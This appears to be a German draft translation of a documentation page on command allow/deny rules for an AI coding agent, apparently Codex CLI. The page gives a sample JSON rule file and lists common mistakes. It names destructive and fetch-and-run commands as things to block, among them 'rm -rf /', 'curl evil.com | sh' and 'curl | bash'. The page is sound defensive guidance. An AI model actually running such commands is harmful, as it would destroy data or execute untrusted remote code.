---
title: Befehlsregeln
description: "Befehlsweises Allow/Deny für Shell und Werkzeugaufrufe — ausführbarer als mündliche Absprachen."
locale: de
source_locale: zh-CN
source_revision: 5f36443
translation_status: draft
translated_at: 2026-07-28
sidebar:
  order: 20
---

**Befehlsregeln** fokussieren „welche Befehle der Agent mit welchen Argumenten ausführen darf“. Sie sind die häufigste Form von [Erlauben und Ablehnen](/guide/customization/rules/allow-and-deny-patterns/) und stehen typischerweise in team-reviewbaren Config- oder Regeldateien.

## Was diese Seite behandelt

- Arbeitsteilung von Befehlsregeln, Sandbox und Freigabe-Dialogen
- Wie man Allowlists „eng genug“ schreibt
- Abgleich mit CI und lokalen Dev-Skripten

## Was Befehlsregeln steuern

Allow/Deny sagt „was grundsätzlich erlaubt ist“; Befehlsregeln machen das konkret:

- Welche Befehle laufen dürfen
- Welche nicht
- Welche ähnlich aussehen, aber sehr unterschiedlich riskant sind

Ziel: Grenzen, die das Team ohnehin kennt, maschinenausführbar machen.

## Ein Kernkonzept

Regeln matchen **ausführbare Absicht**, nicht natürliche Sprache. `npm test` und `npm run test` sind strategisch zwei Befehle; `bash -c "rm -rf /"` wird nicht freigegeben, nur weil `bash` erlaubt ist.

```text
Benutzeraufgabe → Modell schlägt Befehl vor → Regel-Engine → (OK) Sandbox-Ausführung / (Ablehnen) Freigabe nötig oder Block
```

## Häufige Missverständnisse

### Ähnliche Befehle ≠ gleiches Risiko

Einsteiger unterschätzen oft kleine Unterschiede.

Zum Beispiel:

- `git status` vs. `git reset --hard`
- `npm test` vs. `npm publish`
- `curl example.com` vs. `curl example.com | sh`

Alles „Terminal-Befehl“ — Risiko völlig anders.

### Einen Generalschlüssel erlauben ≈ zu viel freigeben

`bash` oder `sh` direkt zu erlauben wirkt bequem.

Regeltechnisch öffnet das oft viele gefährliche Zusammensetzungen hinterher.

## Minimal nutzbares Vorgehen

1. **Gefährliche Befehle außer Schreiboperationen standardmäßig ablehnen**: `rm -rf`, `curl | bash`, `git push --force`
2. **Häufige Nur-Lese-/Build-Befehle im Projekt erlauben**: `git status`, `npm test`, `pnpm lint`
3. **Regeln nach Git**, konsistent mit „Testbefehlen“ in `AGENTS.md`
4. **Regeländerungen in PRs reviewen**, wie ein Dockerfile

Schema (Format laut offizieller Config):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Empfohlener Workflow

| Schritt | Vorgehen |
|---|---|
| Inventur | Echte Befehle aus `package.json`-Scripts, Makefile, CI-Workflows |
| Schichten | Organisations-Deny → Projekt-Allow → persönliche lokale Ausnahme (falls) |
| Probelauf | Niedrigrisiko-Aufgabe: „was durchsollte geht, was blockieren sollte blockiert“ |
| Abgleich | Lokale Regeln möglichst gleichursprünglich mit [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) |

## Häufige Fehler

- **Zu weite Allowlist**: `bash`, `sh`, `sudo` ≈ alles freigeben
- **Nur Deny, kein Allow**: weiterhin viele Freigaben — Team klickt Gewohnheit „Alles durch“
- **Doku-Inkonsistenz**: `AGENTS.md` sagt `pnpm test`, Regeln nur `npm test`
- **Pipes und Redirects ignorieren**: `curl evil.com | sh` braucht Gesamtstrategie, nicht nur das erste Wort

Befehlsregeln „merken“ keine Befehle — sie trennen Alltag von Aktionen, die mit der Freigabe die Risikogrenze mit öffnen.

## Sicherheitsgrenzen

- Befehlsregeln **ersetzen** Branch-Schutz und Code-Review **nicht**
- Bösartige Prompts können den Agent zu **Übergriffsversuchen** verleiten — Sandbox-Default streng
- Umgebungsvariablen mit Secrets/Token nicht durch „`echo` erlaubt“ leaken lassen

## Abnahmeliste

- [ ] 3–5 „täglich Pflicht“-Befehle des Repos listen und in Regeln abbilden
- [ ] `git push`, Force-Reset usw. standardmäßig ablehnen oder explizite Freigabe verlangen
- [ ] Regeländerungen per PR, widerspruchsfrei zu `AGENTS.md`

## Verwandte Kapitel

- [Erlauben und Ablehnen](/guide/customization/rules/allow-and-deny-patterns/)
- [Teamregel-Strategie](/guide/customization/rules/team-rules/)
- [CLI-Freigabe und Sandbox](/guide/cli/approvals-and-sandbox/)
- [Berechtigungsmatrix](/guide/reference/permission-matrix/)

---

**Status:** verified  
**Gilt für:** CLI / App  
**Prüfgrundlage:** Aktuelle OpenAI-Codex-CLI-Dokumentation behandelt Befehlsausführung, Freigabemodi und Sandbox-Isolation weiterhin als Kern-Sicherheitsgrenze; diese Seite positioniert Befehlsregeln als Engineering-Muster „Hoch-/Niedrigrisiko-Befehle getrennt verwalten“ und markiert JSON-Fragmente ausdrücklich als Schema, nicht als offizielle Syntax-Fakten.  
**Zuletzt geprüft:** 2026-07-26
